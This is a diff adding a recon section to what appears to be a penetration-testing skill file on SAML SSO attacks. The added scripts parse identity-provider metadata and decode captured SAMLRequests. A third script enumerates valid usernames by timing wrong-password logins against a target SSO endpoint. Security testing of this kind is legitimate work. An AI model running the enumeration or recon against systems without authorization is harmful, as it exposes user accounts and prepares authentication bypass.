@@ -251,6 +251,135 @@ validate `<Issuer>` or `<AudienceRestriction>`, the attacker-IdP-signed assertio
 
 ---
 
+---
+
+## Recon: Metadata, Request Decoding, and Timing (merged from saml-sso-attack)
+
+The retired `auth/saml-sso-attack` skill is consolidated here. Its recon phases complement the attack list above: parse IdP metadata before choosing a technique, decode captured SAMLRequests with the correct binding (HTTP-Redirect uses raw DEFLATE, POST uses plain base64), and treat timing-based user enumeration as a hint requiring multiple samples, not proof.
+
+### Phase 2 — Extract IdP Metadata
+
+```bash
+METADATA_URL="$1"  # e.g., https://idp.target.com/saml2/idp/metadata.php
+
+echo "[*] Extracting SAML metadata from $METADATA_URL"
+
+METADATA=$(curl -sk --max-time 10 --connect-timeout 10 "$METADATA_URL" 2>/dev/null)
+
+if [[ -z "$METADATA" ]]; then
+  echo "[-] No metadata accessible"
+  exit 1
+fi
+
+# Parse with Python
+echo "$METADATA" | python3 -c "
+import sys
+from xml.etree import ElementTree as ET
+
+content = sys.stdin.read()
+root = ET.fromstring(content)
+
+# Namespaces
+ns = {'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
+      'ds': 'http://www.w3.org/2000/09/xmldsig#'}
+
+# Entity ID
+entity_id = root.get('entityID', 'unknown')
+print(f'Entity ID: {entity_id}')
+
+# Signing certificates
+for cert_el in root.iter('{http://www.w3.org/2000/09/xmldsig#}X509Certificate'):
+    cert = cert_el.text.strip()
+    print(f'Signing Cert ({len(cert)} chars): {cert[:60]}...')
+
+# SSO endpoints
+for el in root.iter():
+    if 'Binding' in el.attrib:
+        binding = el.attrib['Binding']
+        location = el.attrib.get('Location', '')
+        if 'HTTP-Redirect' in binding or 'HTTP-POST' in binding:
+            print(f'Endpoint: {location} [{binding.split(\":\")[-1]}]')
+
+# NameID formats
+for el in root.iter('{urn:oasis:names:tc:SAML:2.0:metadata}NameIDFormat'):
+    print(f'NameID Format: {el.text}')
+" 2>/dev/null
+```
+
+### Phase 3 — Decode & Analyze SAMLRequest
+
+```bash
+SAML_B64="$1"  # from URL parameter or Burp
+
+echo "[*] Decoding SAMLRequest"
+
+echo "$SAML_B64" | python3 -c "
+import sys, base64, zlib
+from xml.etree import ElementTree as ET
+
+raw = sys.stdin.read().strip()
+decoded = base64.b64decode(raw)
+try:
+    decompressed = zlib.decompress(decoded, -15)
+except:
+    decompressed = decoded
+
+xml = decompressed.decode('utf-8', errors='replace')
+print(xml[:3000])
+
+root = ET.fromstring(xml)
+print()
+print('=== Analysis ===')
+
+# Request ID
+req_id = root.get('ID', 'none')
+print(f'Request ID: {req_id}')
+
+# Issuer
+issuer_el = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Issuer')
+if issuer_el is not None:
+    print(f'Issuer: {issuer_el.text}')
+
+# ForceAuthn
+force = root.get('ForceAuthn', 'false')
+print(f'ForceAuthn: {force}')
+
+# NameIDPolicy
+policy_el = root.find('.//{urn:oasis:names:tc:SAML:2.0:protocol}NameIDPolicy')
+if policy_el is not None:
+    allow_create = policy_el.get('AllowCreate', 'false')
+    fmt = policy_el.get('Format', 'unspecified')
+    print(f'NameIDPolicy: AllowCreate={allow_create}, Format={fmt}')
+" 2>/dev/null
+```
+
+### Phase 4 — SSO Timing-Based User Enumeration
+
+```bash
+TARGET="$1"  # SSO login endpoint
+USERS_FILE="$2"  # List of usernames/emails to test
+
+echo "[*] SSO timing-based user enumeration"
+
+# The technique: valid users produce a different response time than invalid users
+# because the server checks LDAP/AD before returning the SAML response
+
+while read -r user; do
+  START=$(date +%s%N)
+  curl -sk -o /dev/null --max-time 15 --connect-timeout 10 \
+    "https://$TARGET/sso/login?username=$user&password=WRONG_PASS" 2>/dev/null
+  END=$(date +%s%N)
+  ELAPSED=$(( (END - START) / 1000000 ))
+
+  echo "  $user: ${ELAPSED}ms"
+  sleep 1
+done < "$USERS_FILE" | sort -t: -k2 -rn | head -20
+
+echo "[*] Users with significantly higher response times likely exist"
+```
+
+---
+
 ## Pitfalls
 - **SAML without signature validation** — unsigned assertions or `WantAssertionsSigned="false"` are the primary SAML findings.
 - **XML signature wrapping (XSW)** — classic SAML attack. Test all 8 XSW variants, not just #1.
